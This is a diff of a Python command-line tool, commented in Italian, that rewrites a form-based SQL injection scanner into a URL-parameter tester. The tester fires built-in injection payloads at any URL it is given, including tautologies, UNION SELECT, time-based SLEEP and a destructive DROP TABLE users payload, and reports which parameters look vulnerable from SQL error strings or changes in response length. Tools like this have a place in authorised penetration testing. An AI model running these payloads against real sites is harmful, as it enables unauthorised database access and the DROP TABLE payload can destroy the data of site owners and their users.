@@ -1,82 +1,159 @@
+#!/usr/bin/env python3
 import requests
-from bs4 import BeautifulSoup
-from urllib.parse import urljoin
+import urllib.parse
+import argparse
+import sys
 
-class SQLInjectionScanner:
-    def __init__(self, timeout=10):
-        self.session = requests.Session()
-        self.session.headers = {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
-        }
-        self.timeout = timeout
-        self.vulnerable_errors = {
-            "quoted string not properly terminated",
-            "unclosed quotation mark",
-            "sql syntax error",
-            "syntax error near"
-        }
+class SQLInjectionTester:
+    def __init__(self, verbose=False, payloads_file=None):
+        self.verbose = verbose
+        self.vulnerable_params = []
+        
+        # Carica i payload
+        self.payloads = self.load_payloads(payloads_file)
+        
+        # Messaggi di errore SQL comuni da cercare
+        self.error_signatures = [
+            "SQL syntax",
+            "mysql_fetch",
+            "MySQL server",
+            "You have an error in your SQL syntax",
+            "ORA-",
+            "Oracle error",
+            "PostgreSQL",
+            "driver.ODBC",
+            "SQLite",
+            "Incorrect syntax near",
+            "ODBC SQL Server Driver",
+            "Microsoft SQL Native Client"
+        ]
 
-    def get_forms(self, url):
+    def load_payloads(self, filename=None):
+        """Carica i payload da un file o usa quelli predefiniti"""
+        default_payloads = [
+            "' OR '1'='1", 
+            "' OR '1'='1' --", 
+            "' OR 1=1--", 
+            "admin' --", 
+            "admin' OR '1'='1", 
+            "1' OR '1'='1'--", 
+            "' UNION SELECT 1,2,3--", 
+            "' AND SLEEP(5)--", 
+            "1'; DROP TABLE users--" 
+        ]
+        
+        if not filename:
+            print(f"Utilizzo {len(default_payloads)} payload predefiniti")
+            return default_payloads
+            
         try:
-            response = self.session.get(url, timeout=self.timeout)
-            soup = BeautifulSoup(response.content, "html.parser")
-            return soup.find_all("form")
-        except requests.exceptions.RequestException as e:
-            print(f"[-] Error fetching {url}: {e}")
-            return []
+            with open(filename, 'r', encoding='utf-8') as file:
+                payloads = [line.strip() for line in file if line.strip() and not line.startswith('#')]
+                
+            if payloads:
+                print(f"Caricati {len(payloads)} payload dal file {filename}")
+                return payloads
+            else:
+                print(f"Il file {filename} non contiene payload validi. Utilizzo i payload predefiniti.")
+                return default_payloads
+                
+        except Exception as e:
+            print(f"Errore durante la lettura del file dei payload: {e}")
+            print("Utilizzo i payload predefiniti")
+            return default_payloads
 
-    @staticmethod
-    def get_form_details(form):
-        details = {
-            "action": form.attrs.get("action", "").lower(),
-            "method": form.attrs.get("method", "get").lower(),
-            "inputs": []
-        }
-        for input_tag in form.find_all("input"):
-            details["inputs"].append({
-                "type": input_tag.attrs.get("type", "text"),
-                "name": input_tag.attrs.get("name"),
-                "value": input_tag.attrs.get("value", "")
-            })
-        return details
-
-    def is_vulnerable(self, response):
-        content = response.content.decode().lower()
-        return any(error in content for error in self.vulnerable_errors)
-
-    def scan_url(self, url):
-        forms = self.get_forms(url)
-        print(f"[+] Detected {len(forms)} forms on {url}.")
-
-        for form in forms:
-            details = self.get_form_details(form)
-            for c in "\"'":
-                data = {}
-                for input_tag in details["inputs"]:
-                    if input_tag["type"] in ("hidden", "submit"):
-                        data[input_tag["name"]] = input_tag["value"] + c
-                    else:
-                        data[input_tag["name"]] = f"test{c}"
-
-                target_url = urljoin(url, details["action"])
-                try:
-                    if details["method"] == "post":
-                        res = self.session.post(target_url, data=data, timeout=self.timeout)
-                    else:
-                        res = self.session.get(target_url, params=data, timeout=self.timeout)
-
-                    if self.is_vulnerable(res):
-                        print(f"[!] SQL Injection vulnerability detected in form at {target_url}")
-                        return True  # Return early if vulnerability found
-                except requests.exceptions.RequestException as e:
-                    print(f"[-] Error testing {target_url}: {e}")
+    def check_vulnerability(self, response, original_content):
+        """Verifica se la risposta indica una vulnerabilità SQL"""
+        # Controlla la presenza di messaggi di errore SQL
+        for signature in self.error_signatures:
+            if signature in response.text:
+                return True
+                
+        # Controlla se il contenuto è significativamente diverso
+        if len(response.text) > len(original_content) * 1.5:
+            return True
+            
+        if len(response.text) < len(original_content) * 0.5:
+            return True
+            
         return False
-    
-    def sql_injector_manager(self):
-        target_url = input('Insert an url: ')
-        is_vulnerable = self.scan_url(target_url)
 
-        if is_vulnerable:
-            print("Vulnerabilità SQL Injection trovata!")
+    def test_url(self, url):
+        """Testa un URL per vulnerabilità SQL injection"""
+        print(f"Testando SQL Injection su: {url}")
+        
+        # Dividi l'URL in base URL e parametri
+        parsed_url = urllib.parse.urlparse(url)
+        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
+        query_params = urllib.parse.parse_qs(parsed_url.query)
+        
+        if not query_params:
+            print("Nessun parametro trovato nell'URL. Aggiungi parametri (es: http://example.com/?id=1)")
+            return
+            
+        print(f"Parametri trovati: {', '.join(query_params.keys())}")
+        
+        # Ottieni una risposta normale per confronto
+        try:
+            normal_response = requests.get(url, timeout=10)
+            original_content = normal_response.text
+        except requests.RequestException as e:
+            print(f"Errore durante la richiesta all'URL originale: {e}")
+            return
+            
+        # Testa ogni parametro con ogni payload
+        for param, values in query_params.items():
+            value = values[0] if values else ""
+            
+            for payload in self.payloads:
+                # Crea l'URL con il payload
+                injected_value = f"{value}{payload}"
+                test_url = f"{base_url}?{param}={urllib.parse.quote(injected_value)}"
+                
+                if self.verbose:
+                    print(f"Testing: {test_url}")
+                
+                try:
+                    # Esegui la richiesta
+                    response = requests.get(test_url, timeout=10)
+                    
+                    # Verifica se la risposta indica una vulnerabilità
+                    if self.check_vulnerability(response, original_content):
+                        print(f"\nPossibile vulnerabilità SQL injection trovata!")
+                        print(f"Parametro: {param}")
+                        print(f"Payload: {payload}")
+                        print(f"URL: {test_url}")
+                        
+                        if param not in self.vulnerable_params:
+                            self.vulnerable_params.append(param)
+                            
+                except requests.RequestException as e:
+                    if self.verbose:
+                        print(f"Errore durante il test di {param} con {payload}: {e}")
+        
+        # Riepilogo finale
+        if self.vulnerable_params:
+            print(f"\nParametri vulnerabili trovati: {', '.join(self.vulnerable_params)}")
         else:
-            print("Nessuna vulnerabilità trovata.")
+            print("\nNessuna vulnerabilità SQL injection rilevata.")
+
+def sql_injector_manager():
+    parser = argparse.ArgumentParser(description='Tool semplice per testare vulnerabilità SQL Injection')
+    parser.add_argument('url', help='URL da testare (es: http://example.com/?id=1)')
+    parser.add_argument('-v', '--verbose', action='store_true', help='Mostra informazioni dettagliate')
+    parser.add_argument('-p', '--payloads', help='File contenente i payload SQL injection (uno per riga)')
+    
+    args = parser.parse_args()
+    
+    # Verifica che l'URL contenga lo schema
+    if not args.url.startswith(('http://', 'https://')):
+        print("L'URL deve iniziare con 'http://' o 'https://'")
+        sys.exit(1)
+    
+    # Esegui il test
+    tester = SQLInjectionTester(
+        verbose=args.verbose,
+        payloads_file=args.payloads
+    )
+    
+    tester.test_url(args.url)
